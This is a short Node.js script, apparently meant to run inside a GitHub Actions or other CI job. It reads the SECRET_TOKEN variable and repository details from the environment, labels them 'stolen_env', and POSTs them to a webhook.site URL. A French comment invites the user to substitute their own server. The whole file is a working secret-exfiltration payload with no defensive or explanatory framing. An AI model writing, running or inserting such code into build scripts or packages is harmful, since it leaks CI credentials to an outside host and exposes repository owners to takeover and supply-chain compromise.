const https = require('https');

const payload = JSON.stringify({
  stolen_env: {
    SECRET_TOKEN: process.env.SECRET_TOKEN,
    GITHUB_ACTOR: process.env.GITHUB_ACTOR,
    GITHUB_REPOSITORY: process.env.GITHUB_REPOSITORY,
    CI: process.env.CI,
  },
  timestamp: new Date().toISOString()
});

const options = {
  hostname: 'webhook.site', // <-- remplace par ton serveur
  port: 443,
  path: '/11d48fb9-597a-4453-8533-101252c96bad',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(payload)
  }
};

const req = https.request(options, res => {
  console.log(`Exfiltration status: ${res.statusCode}`);
});

req.on('error', error => {
  console.error(`Exfiltration error: ${error}`);
});

req.write(payload);
req.end();